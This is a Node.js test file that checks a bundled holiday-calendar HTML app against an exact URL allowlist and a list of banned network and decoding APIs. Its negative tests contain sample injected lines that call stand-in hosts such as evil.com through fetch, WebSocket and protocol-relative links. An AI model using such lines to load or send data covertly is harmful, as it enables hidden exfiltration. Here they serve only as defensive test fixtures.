import { test } from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join } from 'node:path';

const root = join(dirname(fileURLToPath(import.meta.url)), '..');

// 成品裡允許出現的網址（R20 / R31）：逐字相等才放行，不是字首匹配。
//  - 三個假期資料來源模板（只有按「檢查更新」或自動檢查條件成立時才會請求）
//  - 校驗用的 gov.cn 字首（只做字串比較，從不請求）
//  - 自定義網址的輸入框佔位示例（example.com 是 RFC 2606 保留的示例域名，從不請求）
//  - 「匯入文件的格式示例」裡的出處連結（holiday-cn 2026.json 的 papers；只作顯示 / 複製的文字，從不請求；Task 14 / R47）
//  - 主畫面使用者主動點擊的官方 GitHub 專案連結（不由應用程式自動請求）
export const URL_ALLOWLIST = Object.freeze([
  'https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/{year}.json',
  'https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json',
  'https://fastly.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json',
  'https://www.gov.cn/',
  'https://example.com/{year}.json',
  'https://www.gov.cn/zhengce/zhengceku/202511/content_7047091.htm',
  'https://www.dgbas.gov.tw/News_Content.aspx?n=3602&s=235863',
  'https://zhuanlan.zhihu.com/p/2015685656777609855',
  'https://data.gov.tw/dataset/14718',
  'https://data.gov.tw/license',
  'https://www.dgpa.gov.tw/FileConversion?filename=dgpa/files/202506/a52331bd-a189-466b-b0f0-cae3062bbf74.csv&nfix=&name=115%e5%b9%b4%e4%b8%ad%e8%8f%af%e6%b0%91%e5%9c%8b%e6%94%bf%e5%ba%9c%e8%a1%8c%e6%94%bf%e6%a9%9f%e9%97%9c%e8%be%a6%e5%85%ac%e6%97%a5%e6%9b%86%e8%a1%a8.csv',
  'https://www.dgpa.gov.tw/FileConversion?filename=dgpa/files/202607/f538b1ff-ba60-4c63-9477-10db8e6612d1.csv&nfix=&name=116%e5%b9%b4%e4%b8%ad%e8%8f%af%e6%b0%91%e5%9c%8b%e6%94%bf%e5%ba%9c%e8%a1%8c%e6%94%bf%e6%a9%9f%e9%97%9c%e8%be%a6%e5%85%ac%e6%97%a5%e6%9b%86%e8%a1%a8_utf8bom.csv',
  'https://github.com/kevin-kuantso/work-motivator',
]);
// 不帶主機名的 "https://" 只允許出現在這兩個固定上下文裡（R31），且成品裡出現的次數固定（見下方 dist 測試）。
// 其他任何裸 "https://"（例如 "https://" + host 的拼接）都會被當成 URL 報出來。
export const BARE_SCHEME_CONTEXTS = Object.freeze([
  'var SCHEME = "https://";', // holiday-data.js：校驗自定義網址的字首
  '必须以 https:// 开头', // strings：自定義網址的錯誤提示 + 進階設定裡常駐的格式提示（Task 14）
  '必須以 https:// 開頭',
]);
const BARE_SCHEME_COUNTS = Object.freeze({ 'var SCHEME = "https://";': 1, '必须以 https:// 开头': 2, '必須以 https:// 開頭': 2 });
const BARE_SCHEME = /https?:\/\/(?![A-Za-z0-9])/gi;

export function findExternalRefs(html) {
  const problems = [];
  if (/<script[^>]*\ssrc\s*=/i.test(html)) problems.push('external <script src>');
  if (/<link\b/i.test(html)) problems.push('<link>');
  if (/<img[^>]*\ssrc\s*=/i.test(html)) problems.push('<img src>');
  if (/<iframe\b/i.test(html)) problems.push('<iframe>');
  if (/<embed\b/i.test(html)) problems.push('<embed>');
  if (/<object\b/i.test(html)) problems.push('<object>');
  if (/<source[^>]*\ssrc(set)?\s*=/i.test(html)) problems.push('<source src>');
  // CSS 只在 <style> 與 style="" 裡找（JS 裡的 new URL( 不是 CSS）
  const css = [...html.matchAll(/<style[^>]*>([\s\S]*?)<\/style>/gi), ...html.matchAll(/\sstyle\s*=\s*"([^"]*)"/gi)].map((m) => m[1]).join('\n');
  if (/\burl\(\s*(?!["']?data:)/i.test(css)) problems.push('CSS url(');
  if (/@import\b/i.test(css)) problems.push('CSS @import');
  // 拼出來的網址：協議字面量後面接 +，或模板字串裡協議後面直接是 ${
  if (/["'`]\s*(https?|wss?):\/\/\s*["'`]\s*\+/i.test(html)) problems.push('concatenated scheme');
  if (/(https?|wss?):\/\/\$\{/i.test(html)) problems.push('template-literal scheme');
  if (/\bimport\s*\(/.test(html)) problems.push('dynamic import(');
  if (/\bwss?:\/\//i.test(html)) problems.push('ws:// / wss://');
  // 協議相對網址（//host…）出現在字串或屬性值的開頭
  if (/(["'`]|=\s*)\/\/[A-Za-z0-9-]+(\.[A-Za-z0-9-]+)+/.test(html)) problems.push('protocol-relative //host');
  let rest = html;
  for (const ctx of BARE_SCHEME_CONTEXTS) rest = rest.split(ctx).join(' ');
  const urls = rest.match(/https?:\/\/[^\s"'`<>)]*/gi) ?? [];
  for (const u of urls) {
    if (u.startsWith('http://www.w3.org/')) continue; // SVG xmlns
    if (URL_ALLOWLIST.includes(u)) continue;
    problems.push(`URL: ${u}`);
  }
  return problems;
}

test('dist is one self-contained file', () => {
  execFileSync('node', ['build.mjs'], { cwd: root, stdio: 'pipe' });
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  assert.deepEqual(findExternalRefs(html), []);
  assert.match(html, /<script>[\s\S]+<\/script>/);
  assert.match(html, /<style>[\s\S]+<\/style>/);
});

test('checker flags injected external refs (negative check)', () => {
  assert.ok(findExternalRefs('<script src="a.js"></script>').length);
  assert.ok(findExternalRefs('<link rel="stylesheet" href="a.css">').length);
  assert.ok(findExternalRefs('<script>fetch("https://x.com")</script>').length);
  assert.ok(findExternalRefs('<script>fetch("http://x.com")</script>').length);
  assert.deepEqual(findExternalRefs('<svg xmlns="http://www.w3.org/2000/svg"></svg>'), []);
});

test('allowlist is exact: allowed endpoints pass, anything else (incl. look-alikes) fails (negative proof)', () => {
  for (const u of URL_ALLOWLIST) assert.deepEqual(findExternalRefs(`<script>const a = '${u}';</script>`), [], u);
  const bad = [
    '<img src="https://x.com/a.png">',
    '<img alt="" src="data:image/png;base64,AA">', // 任何 <img src> 都不允許
    '<link rel="icon" href="https://x.com/f.ico">',
    '<link rel="preconnect" href="https://cdn.jsdelivr.net">',
    '<style>body{background:url(https://x.com/a.png)}</style>',
    '<style>body{background:url("/a.png")}</style>',
    '<style>@import "https://x.com/a.css";</style>',
    '<iframe src="about:blank"></iframe>',
    '<embed src="x.swf">',
    '<object data="x"></object>',
    '<video><source src="https://x.com/a.mp4"></video>',
    '<picture><source srcset="a.png"></picture>',
    // R31：評審復現的三種拼接（之前因為裸 "https://" 在白名單裡而漏掉）
    '<script>fetch("https://"+"evil.com/a.js")</script>',
    "<script>fetch('https://' + host + '/x')</script>",
    '<script>import("https://"+h)</script>',
    '<script>fetch(`https://${host}/x`)</script>',
    '<script>import("./a.js")</script>',
    '<script>fetch("//evil.com/a.js")</script>',
    '<a href="//evil.com/x">x</a>',
    "<script>new WebSocket('wss://evil.com/s')</script>",
    "<script>new WebSocket('ws://evil.com/s')</script>",
    '<script>const s = "https://";</script>',
    '<script>var SCHEME = "https:// ";</script>',
    '<div style="background:url(https://x.com/a.png)"></div>',
    '<script src="https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/2027.json"></script>',
    "<script>fetch('https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/evil.js')</script>",
    "<script>fetch('https://raw.githubusercontent.com/evil/holiday-cn/master/{year}.json')</script>",
    "<script>fetch('https://cdn.jsdelivr.net/gh/NateScarlet/holiday-cn@master/{year}.json.evil')</script>",
    "<script>fetch('https://www.gov.cn/x.js')</script>",
    "<script>fetch('https://www.gov.cn.evil.com/')</script>",
    "<script>fetch('https://example.com/{year}.json/x')</script>",
    "<script>fetch('https://example.com/')</script>",
    "<script>fetch('https://ghproxy.com/https://raw.githubusercontent.com/NateScarlet/holiday-cn/master/{year}.json')</script>",
    '<script>fetch(`https://evil.com/${y}`)</script>',
    "<script>fetch('http://evil.com/www.w3.org/')</script>",
  ];
  for (const b of bad) assert.ok(findExternalRefs(b).length > 0, `must be flagged: ${b}`);
  // CSS 的 data: url 仍允許（目前沒用到，但不是外部引用）
  assert.deepEqual(findExternalRefs('<style>a{background:url(data:image/png;base64,AA)}</style>'), []);
});

test('bare "https://" is allowed only in its two fixed contexts (R31)', () => {
  for (const ctx of BARE_SCHEME_CONTEXTS) assert.deepEqual(findExternalRefs(`<script>${ctx}</script>`), [], ctx);
  assert.ok(findExternalRefs('<script>var SCHEME = "https://"; fetch("https://" + x)</script>').length > 0, 'a second bare scheme next to the allowed one is still flagged');
});

test('dist: bare "https://" occurs exactly in the two fixed contexts, a fixed number of times each (any new occurrence fails)', () => {
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  const total = Object.values(BARE_SCHEME_COUNTS).reduce((a, b) => a + b, 0);
  assert.equal((html.match(BARE_SCHEME) ?? []).length, total);
  for (const ctx of BARE_SCHEME_CONTEXTS) assert.equal(html.split(ctx).length - 1, BARE_SCHEME_COUNTS[ctx], ctx);
});

test('dist: the bundled source URLs are exactly the three defaults (no extra endpoint slipped in)', () => {
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  const urls = new Set(html.match(/https?:\/\/[^\s"'`<>)]*/gi) ?? []);
  for (const u of URL_ALLOWLIST.slice(0, 3)) assert.ok(urls.has(u), `bundled: ${u}`);
});

// ---- Task 14 E2：結構檢查（成品裡的網路 / 解碼 API 與 SCHEME 用法固定不變） ----
// 成品不得出現這些（任何一個出現都可能被用來拼出或送出隱藏的網址）
export const FORBIDDEN_TOKENS = Object.freeze(['fromCharCode', 'fromCodePoint', 'atob(', 'WebSocket', 'EventSource', 'sendBeacon', 'XMLHttpRequest', 'new Image']);
// 已存假期年份的 source 校驗（holiday-store.js）用正則字面量寫協議，成品裡是轉義後的 https:\/\/；只允許這一處
const ESCAPED_SCHEME = /https?:\\\/\\\//gi;

export function structuralProblems(html) {
  const problems = [];
  const scheme = html.match(/\bSCHEME\b/g)?.length ?? 0;
  if (scheme !== 3) problems.push(`SCHEME identifier ${scheme} times (expected 3: declaration + two startsWith)`);
  const starts = html.split('.startsWith(SCHEME)').length - 1;
  if (starts !== 2) problems.push(`.startsWith(SCHEME) ${starts} times (expected 2)`);
  if ((html.match(/\bvar SCHEME = "https:\/\/";/g)?.length ?? 0) !== 1) problems.push('SCHEME declaration missing or repeated');
  for (const tok of FORBIDDEN_TOKENS) if (html.includes(tok)) problems.push(`forbidden: ${tok}`);
  const esc = html.match(ESCAPED_SCHEME)?.length ?? 0;
  if (esc !== 1) problems.push(`escaped scheme https:\\/\\/ ${esc} times (expected 1: holiday-store source check)`);
  return problems;
}

test('dist structure: SCHEME used exactly 3 times (decl + two startsWith); no fromCharCode / fromCodePoint / atob( / WebSocket / EventSource / sendBeacon / XMLHttpRequest / new Image', () => {
  execFileSync('node', ['build.mjs'], { cwd: root, stdio: 'pipe' });
  const html = readFileSync(join(root, 'dist/work-motivator.html'), 'utf8');
  assert.deepEqual(structuralProblems(html), []);
});

test('structural checker flags each violation (negative proofs)', () => {
  const ok = [
    'var SCHEME = "https://";',
    'if (!s.startsWith(SCHEME)) x();',
    'if (!u.startsWith(SCHEME)) y();',
    'const R = /^https:\\/\\/[^/\\s]/;',
  ].join('\n');
  assert.deepEqual(structuralProblems(ok), [], 'the reference shape passes');
  const bad = {
    'a 4th SCHEME use': `${ok}\nfetch(SCHEME + host);`,
    'a 3rd startsWith but one fewer other use': ok.replace('var SCHEME = "https://";', 'var SCHEME = "https://";\nz.startsWith(SCHEME);'),
    'SCHEME declared with another value': ok.replace('"https://"', '"http://"'),
    'fromCharCode': `${ok}\nString.fromCharCode(104,116)`,
    'atob(': `${ok}\natob("aHR0cHM6Ly8=")`,
    'WebSocket': `${ok}\nnew WebSocket(u)`,
    'EventSource': `${ok}\nnew EventSource(u)`,
    'sendBeacon': `${ok}\nnavigator.sendBeacon(u, d)`,
    'fromCodePoint': `${ok}\nString.fromCodePoint(104, 116)`,
    'XMLHttpRequest': `${ok}\nconst x = new XMLHttpRequest();`,
    'new Image': `${ok}\nnew Image().src = u;`,
    'second escaped scheme regex': `${ok}\nconst Q = /http:\\/\\/x/;`,
    'escaped scheme regex removed': ok.replace('const R = /^https:\\/\\/[^/\\s]/;', ''),
  };
  for (const [what, html] of Object.entries(bad)) assert.ok(structuralProblems(html).length > 0, `must be flagged: ${what}`);
});
